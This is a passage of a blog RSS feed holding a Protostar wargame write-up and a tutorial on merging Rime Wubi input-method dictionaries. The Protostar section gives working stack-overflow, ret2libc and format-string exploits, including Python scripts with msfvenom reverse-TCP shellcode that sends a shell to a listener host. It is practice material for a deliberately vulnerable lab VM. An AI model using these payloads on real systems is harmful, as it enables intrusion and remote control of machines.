        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/</guid>
        
        <category>stack</category>
        
        <category>linux</category>
        
        <category>disassemble</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>protostar系统学习</title>
        <description>&lt;h4 id=&quot;xff-about-protostar&quot;&gt;0xff About Protostar&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Protostar introduces the following in a friendly way:

Network programming
Byte order
Handling sockets
Stack overflows
Format strings
Heap overflows
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.&lt;/p&gt;

&lt;p&gt;In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;official website:       https://exploit-exercises.com/protostar
nebula.iso download:    http://pan.baidu.com/s/1nvq3f5J
some witeup:    
    https://lightless.me/archives/protostar-stack-writeup.html
    http://bug.cool/2016/Protostar_Writeup/
    https://lightless.me/archives/protostar-format-writeup.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x00-stack0&quot;&gt;0x00 stack0&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    cd /opt/protostar/bin
    objdump -d -M intel stack0 &amp;gt; /tmp/stack0.out
    vi stack0.out
link knowledge:
    http://blog.163.com/lixiangqiu_9202/blog/static/535750372012727102618226/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x01-stack1&quot;&gt;0x01 stack1&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    python -c &quot;print &#39;A&#39;*64+&#39;\x64\x63\x62\x61&#39;&quot; | xargs ./stack1
link knowledge:
    the command:
        python -c &quot;print &#39;A&#39;*64+&#39;\x64\x63\x62\x61&#39;&quot; | ./stack1 
    will not work,coz this protostar is different from the first nebula system
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-stack2&quot;&gt;0x02 stack2&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    export GREENIE=`python -c &quot;print &#39;A&#39;*64+&#39;\x0a\x0d\x0a\x0d&#39;&quot;`
    ./stack2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x03-stack3&quot;&gt;0x03 stack3&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    gdb ./stack3
    b win
    output:breakpoint 1 at 0x804842a...
    quit
    python -c &quot;print &#39;A&#39;*64+&#39;\x2a\x84\x04\x08&#39;&quot; | ./stack3
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x04-stack4&quot;&gt;0x04 stack4&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    gdb ./stack4
    disas win
        查得win函数的地址为080483f4
    disas main
    b *main+3
        esp最后一位置0,实时跟踪esp最后一位为8
        填充字节数为8+64+4(4为main函数中的ebp所占空间)=76
        最后确定77-80个字节为覆盖main函数的返回地址的位置
    q
    y
    r &amp;lt; /tmp/stack4
        /tmp/stack4为AAA..A1234(76个A+1234)
    vi /tmp/stack4
    :%!xxd
        修改31323334处为f4830408
    :%!xxd -r(保存作用)
    gdb ./stack4
    r &amp;lt; /tmp/stack4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x05-stack5&quot;&gt;0x05 stack5&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    su
    godmode
    vi /proc/sys/fs/suid_dumpable
        设置为1,允许suid文件可以dump
    cd /tmp
    vi stack5.py
    ----------stack5.py---------
    #!/usr/bin/python
    import os
    import sys
    import struct
    
    shellcode1=&quot;\x90&quot;*40
    shellcode1=&quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80&quot;
    
    shellcode =  &quot;\x90&quot;*30
    #msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=4444 -b \x00 -f py
    shellcode += &quot;\xda\xd1\xbe\xd9\xba\xd5\x41\xd9\x74\x24\xf4\x58\x29&quot;
    shellcode += &quot;\xc9\xb1\x12\x31\x70\x1a\x83\xc0\x04\x03\x70\x16\xe2&quot;
    shellcode += &quot;\x2c\x8b\x0e\xb6\x2d\xbf\xf3\x6a\xdb\x42\x44\xea\x92&quot;
    shellcode += &quot;\xa2\x69\x73\x33\x7f\x1a\xb4\x93\x83\xb0\x5c\xe1\x83&quot;
    shellcode += &quot;\x55\xc1\x6c\x62\x3f\x9f\x36\x35\x91\x08\x4f\x54\x52&quot;
    shellcode += &quot;\x7a\xcf\x25\x52\x3d\xcf\x59\x5d\x3d\x46\xba\x9c\xd6&quot;
    shellcode += &quot;\x54\xfc\xfc\x25\xd4\x83\xcf\xb6\x4f\xf5\x31\x2f\xd9&quot;
    shellcode += &quot;\x09\x02\x53\xe8\x92\x9d\xb5&quot;
    
    ret=0xbffff780
    payload = &#39;A&#39;*76+struct.pack(&quot;&amp;lt;I&quot;,ret)+shellcode
    f=open(&quot;/tmp/tmp.txt&quot;,&quot;a+&quot;)
    f.write(payload)
    f.close()
    input=payload
    #print input
    os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack5&quot; % input)
    ------------end-------------
    use msf listen on 4444 with the same payload
    python stack5.py
    gdb -q -c co[tab]
    output:permission denied
    ls -al /tmp/co[tab]
    output:
    -rw-------  1 root user 163840 Jun  9 01:19 core.11.stack5.6174
    su
    godmode
    chmod 777 /tmp/co[tab]
    su - user
    user
    bash
    cd /tmp
    gdb -q -c co[tab]
    x/20x $esp
    ----output:-------
    0xbffff850:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffff860:     0x90909090      0x90909090      0x90909090      0xd1da9090
    0xbffff870:     0xd5bad9be      0x2474d941      0xc92958f4      0x703112b1
    ------end---------
    vi /tmp/stack5.py
    ----------stackt.py on ret---------
    ret=0xbffff850
    ----------------end----------------
    python stack5.py
    msf receive a shell from protostar
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x06-stack6&quot;&gt;0x06 stack6&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    构造如下链:
    &#39;A&#39;*80+system_addr+exit_addr+command_addr+command(=&#39;/bin/sh\x00&#39;)
    gdb stack6
    disas getpath
    b*getpath+117(at ret in func getpath)
    r
    AAAAAAAA
    x/20x $esp-80(make sure it is 0x41414141)
    output:
    0xbffff6dc:     0x41414141      0x41414141      0xb7ec6100      0xbffff708
    command_addr=0xbffff7cc+80+4+4+4=0xbffff828
    print system
    output:0xb7ecffb0
    print exit
    output:0xb7ec60c0
    python -c &quot;print &#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x58\xf7\xff\xbf&#39;+&#39;echo succeed&#39;+&#39;\x00&#39;&quot; | ./stack6ython -c &quot;print &#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x48\xf7\xff\xbf&#39;+&#39;/bin/sh\x00&#39;&quot; | ./stack6
    the output is not obviously
    python -c &quot;print &#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x28\xf8\xff\xbf&#39;+&#39;echo 123456&#39;+&#39;\x00&#39;&quot; | /opt/protostar/bin/stack6
    output:看上去什么也没发生,应该没有执行成功,然而后来gdb却发现可以成功,具体如下
    cd /tmp
    vi stack6.py
    --------/tmp/stack6.py----------
    buf=&#39;A&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\x28\xf8\xff\xbf&#39;+&#39;/bin/echo succeed &amp;gt; /tmp/succeed.txt&#39;+&#39;\x00&#39;
    f=open(&quot;/tmp/stack6.txt&quot;,&quot;a+&quot;)
    f.write(buf)
    f.close()
    -------------end----------------
    gdb /opt/protostar/bin/stack6
    r &amp;lt; /tmp/stack6.txt
    vi /tmp/succeed.txt
    output:succeed
    此时已经成功写文件,奇怪!居然只有在gdb调试的时候用finish才会成功执行,而不用上面的gdb的过程无法成功执行命令
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x07-stack7&quot;&gt;0x07 stack7&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    形如0xbxxxxxxx或0xfxxxxxxx的地址(system等系统函数地址)不可使用
    objdump -d stack7
    find .text has someplace with:
    ---------.text-----------
    8048492:       5b                      pop    %ebx
    8048493:       5d                      pop    %ebp
    8048494:       c3                      ret  
    -----------end-----------
    构造如下链:
    &#39;A&#39;*80+&#39;\x92\x84\x04\x08&#39;+&#39;BBBBBBBB&#39;+shellcode_addr+shellcode
    use msf start a listener with the same payload like below
    vi /tmp/stack7.py
    -----------stack7.py---------
    #!/usr/bin/python
    import os
    import sys
    import struct
    
    shellcode1=&quot;\x90&quot;*40
    shellcode1=&quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80&quot;
    
    shellcode =  &quot;\x90&quot;*30
    #msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=4444 -b \x00 -f py
    shellcode += &quot;\xda\xd1\xbe\xd9\xba\xd5\x41\xd9\x74\x24\xf4\x58\x29&quot;
    shellcode += &quot;\xc9\xb1\x12\x31\x70\x1a\x83\xc0\x04\x03\x70\x16\xe2&quot;
    shellcode += &quot;\x2c\x8b\x0e\xb6\x2d\xbf\xf3\x6a\xdb\x42\x44\xea\x92&quot;
    shellcode += &quot;\xa2\x69\x73\x33\x7f\x1a\xb4\x93\x83\xb0\x5c\xe1\x83&quot;
    shellcode += &quot;\x55\xc1\x6c\x62\x3f\x9f\x36\x35\x91\x08\x4f\x54\x52&quot;
    shellcode += &quot;\x7a\xcf\x25\x52\x3d\xcf\x59\x5d\x3d\x46\xba\x9c\xd6&quot;
    shellcode += &quot;\x54\xfc\xfc\x25\xd4\x83\xcf\xb6\x4f\xf5\x31\x2f\xd9&quot;
    shellcode += &quot;\x09\x02\x53\xe8\x92\x9d\xb5&quot;
    
    ret=0x08048492
    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x41\x41\x41\x41&#39; #without shellcode here
    f=open(&quot;/tmp/stack7.txt&quot;,&quot;a+&quot;)
    f.write(payload)
    f.close()
    input=payload
    #print input
    #os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack7&quot; % input) #执行此行时会发生乱码影响shellcode_addr的查找,这句先不执行
    -------------end-------------
    gdb /opt/protostar/bin/stack7
    disas getpath
    b*getpath+128(at ret in getpath func)
    r &amp;lt; /tmp/stack7.txt
    x/20x $esp
    output:
    0xbffff73c:     0x08048492      0x42424242      0x42424242      0x41414141
    0xbffff74c:     0xb7eadc00      0x00000001      0xbffff7f4      0xbffff7fc
    so shellcode_addr=0xbffff74c
    vi /tmp/stack7.py
    ------add shellcode and modified shellcode_addr------
    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x4c\xf7\xff\xbf&#39;+shellcode
    ...
    os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack7&quot; % input)
    -----------------------end---------------------------
    rm stack7.txt
    python stack7.py
    失败,系统乱码,并未反弹shell,于是分析core文件,gdb动态调试时的地址不一定是正确的
    ulimit -c unlimited
    -------modify /tmp/stack7.py--------
    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x4c\xf7\xff\xbf&#39;
    ...
    #os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack7&quot; % input)
    ---------------end------------------
    rm stack7.txt
    python stack7.py
    /opt/protostar/bin/stack7 &amp;lt; /tmp/stack7.txt
    su 
    godmode
    chmod 777 co[tab]
    gdb -q -c co[tab]
    x/20x $esp-4
    output:
    0xbffff848:     0xbffff83c      0x90909090      0x90909090      0x90909090
    0xbffff858:     0x90909090      0x90909090      0x90909090      0x90909090
    ---------modify /tmp/stack7.py--------
    payload = &#39;A&#39;*80+struct.pack(&quot;&amp;lt;I&quot;,ret)+&#39;BBBBBBBB&#39;+&#39;\x4c\xf8\xff\xbf&#39;+shellcode
    ...
    os.system(&quot;echo &#39;%s&#39; | /opt/protostar/bin/stack7&quot; % input)
    ------------------end-----------------
    rm stack7.txt
    python stack7.py
    msf receive a shell connect from protostar
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x07-format0&quot;&gt;0x07 format0&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    ./format0 `python -c &quot;print &#39;A&#39;*64+&#39;\xef\xbe\xad\xde&#39;&quot;`
    但是题目要求输入为10字节以内,so
    ./format0 `python -c &quot;print &#39;%64d&#39; + &#39;\xef\xbe\xad\xde&#39;&quot;`
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x08-format1&quot;&gt;0x08 format1&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    objdump -t format1
    find target address:0x8049638
    ./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.%x&#39;&quot;`
    -------------output:--------------
    AAAABBBB804960c.bffff788
    --------------end-----------------
    ./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%2\$x&#39;&quot;`
    ----------------output:----------------
    AAAABBBB
    ------------------end------------------
    结论:这里不能用\$
    ./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*140&quot;`
    ---------------output:----------------
    AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7be.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.d5f4313f.ffa7a72f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b4.bffff7be.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.d3000000.e844f82d.2820150f.79187f9d.69c015e8.363836.0.6f662f2e.74616d72.41410031.42424141.78254242.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
    ------------------end-----------------
    find 42424141 in the 132th print location
    -----------------output:----------------
    AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7bb.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.b3c0b28e.9993249e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b1.bffff7bb.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.84000000.a999d71b.1ef8a615.f39ada32.69642dc2.363836.662f2e00.616d726f.41003174.42414141.25424242.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
    --------------------end-----------------
    find 42414141 in the 131th print location
    结论:AAAABBBB的在栈中出现的位置会随着输入的长度不同而变化
    根据./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*140&quot;`中132个输出为42424141:
    ./format1 `python -c &quot;print &#39;AA\x38\x96\x04\x08BB&#39;+&#39;%x.&#39;*131+&#39;%n.&#39;+&#39;%x.&#39;*8&quot;`
    output:
    .....you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x09-format2&quot;&gt;0x09 format2&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    objdump -t format2
    find target address:80496e4
    python -c &quot;print &#39;%x.&#39;*2&quot; | ./format2
    --------output:---------
    200.b7fd8420.
    ---------end------------
    python -c &quot;print &#39;%2\$x.&#39;&quot; | ./format2
    ------------output:-----------
    b7fd8420.
    -------------end--------------
    结论:支持\$
    python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*10&quot; | ./format2
    ---------output:----------
    AAAABBBB200.b7fd8420.bffff5c4.41414141.42424242.252e7825.78252e78.2e78252e.252e7825.78252e78.
    -----------end------------
    python -c &quot;print &#39;\xe4\x96\x04\x08BBBB%56x&#39;+&#39;%4\$n&#39;&quot; | ./format2
    output:
    you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;xa-format3&quot;&gt;0xA format3&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    objdump -t format3
    find target address:80496f4
    python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*2&quot; | ./format3
    --------output:---------
    AAAABBBB0.bffff580.
    ------------end---------
    python -c &quot;print &#39;AAAABBBB&#39;+&#39;%2\$x&#39;&quot; | ./format3
    --------output:--------
    AAAABBBBbffff580
    ----------end----------
    结论:支持\$
    python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*13&quot; | ./format3
    ---------output:--------
    AAAABBBB0.bffff580.b7fd7ff4.0.0.bffff788.804849d.bffff580.200.b7fd8420.bffff5c4.41414141.42424242.
    -----------end----------
    python -c &quot;print &#39;\xf4\x96\x04\x08BBBB%16930108x&#39;+&#39;%12\$n&#39;&quot; | ./format
    output:
    ...you have modified the target:)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;xb-format4&quot;&gt;0xB format4&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    gdb查找函数hello的地址(gdb找函数地址好像是不会变的,动态调试中的参数变量似乎会改变)
    gdb format4
    disas hello
    output:
    0x080484b4 &amp;lt;hello+0&amp;gt;:   push   %ebp
    查找exit()在GOT表中的位置
    objdump -TR format4
    ---------output:----------
    DYNAMIC RELOCATION RECORDS
    OFFSET   TYPE              VALUE 
    080496fc R_386_GLOB_DAT    __gmon_start__
    08049730 R_386_COPY        stdin
    0804970c R_386_JUMP_SLOT   __gmon_start__
    08049710 R_386_JUMP_SLOT   fgets
    08049714 R_386_JUMP_SLOT   __libc_start_main
    08049718 R_386_JUMP_SLOT   _exit
    0804971c R_386_JUMP_SLOT   printf
    08049720 R_386_JUMP_SLOT   puts
    08049724 R_386_JUMP_SLOT   exit
    -----------end------------
    find exit address is saved in 08049724,that is:exit_address=[08049724]
    尝试在0x08049724中写入0x080484b4
    python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*10&quot; | ./format4
    -----------output:------------
    AAAABBBB200.b7fd8420.bffff5c4.41414141.42424242.252e7825.78252e78.2e78252e.252e7825.78252e78.
    -------------end--------------
    python -c &quot;print &#39;\x24\x97\x04\x08BBBB%134513836x&#39;+&#39;%4\$n.&#39;&quot; | ./format4
    output:
    ...code execution redirected! you win
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 03 Jun 2016 00:00:00 +0800</pubDate>
        <link>/linux/2016/06/03/protostar/</link>
        <guid isPermaLink="true">/linux/2016/06/03/protostar/</guid>
        
        <category>overflow</category>
        
        <category>linux</category>
        
        
        <category>linux</category>
        
      </item>
    
      <item>
        <title>rime五笔词库合并</title>
        <description>&lt;h4 id=&quot;x01-step1on-kali-linux&quot;&gt;0x01 Step1:on kali linux&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/rime_dic_manager -l
output:wubi86
cd /root/桌面/
/usr/bin/rime_dic_manager -e wubi86 kali.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-step2on-win7&quot;&gt;0x02 Step2:on win7&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd %appdata%\rime
copy wubi86.userdb.kct \\kali\桌面\
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x03-step3on-kali-linux&quot;&gt;0x03 Step3:on kali linux&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /root/.config/fcitx/rime
mv /root/.config/fcitx/rime/wubi86.userdb.kct wubi86.userdb.kct.bak
cp /root/桌面/wubi86.userdb.kct .
重新布置rime
/usr/bin/rime_dic_manager -l
cd /root/桌面
/usr/bin/rime_dic_manager -e wubi86 win7.txt

-------------------two ways since now---------------
first:
/usr/bin/rime_dic_manager -i wubi86 kali.txt
重新布置rime

second:
vi -d kali.txt win7.txt
vi kali.txt
    G
    o
    esc
    :r win7.txt
    :x
python 字典去重.py kali.txt         (output:outfile.txt)
    this .py script:https://raw.githubusercontent.com/3xp10it/password_tools/master/%E5%AD%97%E5%85%B8%E6%95%B4%E7%90%86%E5%8E%BB%E9%87%8D%E5%B7%A5%E5%85%B7/%E5%AD%97%E5%85%B8%E6%95%B4%E7%90%86%E5%8E%BB%E9%87%8D%E5%B7%A5%E5%85%B7.py

/usr/bin/rime_dict_manager -r outfile.txt
or
/usr/bin/rime_dict_manager -i wubi86 outfile.txt

重新布置rime
---------------------end----------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;update&quot;&gt;update&lt;/h3&gt;

&lt;h4 id=&quot;section&quot;&gt;16-05-25&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;win7:
程序-&amp;gt;用户词库管理-&amp;gt;导出词典快照(rime-&amp;gt;rime)
                  -&amp;gt;导出文本码表(dic-&amp;gt;newdic)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;the difference between 词典快照 and 文本码表&lt;/p&gt;

&lt;p&gt;1.词典快照
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/%E8%AF%8D%E5%85%B8%E5%BF%AB%E7%85%A7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2.文本码表
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/%E6%96%87%E6%9C%AC%E7%A0%81%E8%A1%A8.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;section-1&quot;&gt;16-05-28&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python script:(performs well on kali,but not on win7)

download:
https://raw.githubusercontent.com/3xp10it/little_scripts/master/rimedic_handle.py

---------rimedic_handle.py------------
import sys
fp=open(sys.argv[1])
all=fp.readlines()
fp.close()
#print len(all)
newall2in3=[]
fp=open(&quot;newdic.txt&quot;,&quot;a+&quot;)
for eachline in all:
    if &quot;#&quot; not in eachline:
        eachline2in3=eachline.split(&#39;\t&#39;)[:2]
        if eachline2in3 not in newall2in3 and &#39;enc&#39; not in eachline and &#39; &#39; not in eachline2in3[0] and (eachline2in3[0][0]&amp;lt;&#39;a&#39; or eachline2in3[0][0]&amp;gt;&#39;z&#39;):
            newall2in3.append(eachline2in3)
            fp.write(eachline)

#print len(newall)
fp.close()
--------------------------------------
get pure txt dic
    different from real rime dic,this pure txt dic does not exist the rime dic header like
        # rime-...
        # user-id...
    but this pure txt dic has the same \t split symbol as real rime dic

dic from win7:
    导出文本码表
    cp out.txt \\kali\root\out.txt
    cd \\kali\root
    python rimedic_handle.py out.txt
    output:newdic.txt

dic from kali:
    cd /root/.config/fcxti/rime
    pkill fcitx
    /usr/bin/rime_dict_manager -e wubi86 /root/kali.txt
    cd /root
    python rimedic_handle.py kali.txt
    output:newdic.txt
    restart fcitx:
        http://www.findspace.name/res/786
        -----------content------------
        pidof fcitx | xargs kill
        pidof sogou-qimpanel | xargs kill
        nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
        nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
        -----------end----------------
        
        or:
        --------content---------
        pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;;nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
        ---------end------------

make myown larger dic
    
    download 8万精准超小词库.txt from 
        https://github.com/studyzy/imewlconverter/tree/master/IME%20WL%20Converter/%E5%8F%82%E8%80%83
    download scel from sougou wubi website
        http://wubi.sogou.com/dict/
    use imewlconverter.exe(深蓝词库转换工具) to convert from upon dics.txt to 8w_sougou_rime_wubi86_dic.txt
    *attention*:
        do not forget to change frequency from 10 to 1 when turning sougou scel to rime dic,the number of frequency words from sougou scel may not be 1,but bigger like 10.
    
    cd \\kali\root
    vi 8w_sougou_rime_wubi86_dic.txt
    G
    :r newdic.txt
    XX
    rm newdic.txt
    python rimedic_handle.py 8w_sougou_rime_wubi86_dic.txt
    output:newdic.txt
    
    16-05-28 newdic.txt&#39;s download link:
        8w only:
            http://pan.baidu.com/s/1c2uiZks
        8w+scel_sougou_new_added_frequency_to_1:
            http://pan.baidu.com/s/1miMsYhU
    
    import:
        kali:
            cd /root/.config/fcitx/rime
            /usr/bin/rime_dic_manager -i wubi86 /root/newdic.txt
        win7:
            导入文本码表----&amp;gt;\\kali\root\newdic.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 24 May 2016 00:00:00 +0800</pubDate>
        <link>/auxilary/2016/05/24/rime%E4%BA%94%E7%AC%94%E8%AF%8D%E5%BA%93%E5%90%88%E5%B9%B6/</link>
        <guid isPermaLink="true">/auxilary/2016/05/24/rime%E4%BA%94%E7%AC%94%E8%AF%8D%E5%BA%93%E5%90%88%E5%B9%B6/</guid>
        
        <category>type</category>
        
        <category>rime</category>
        
        
        <category>auxilary</category>
        
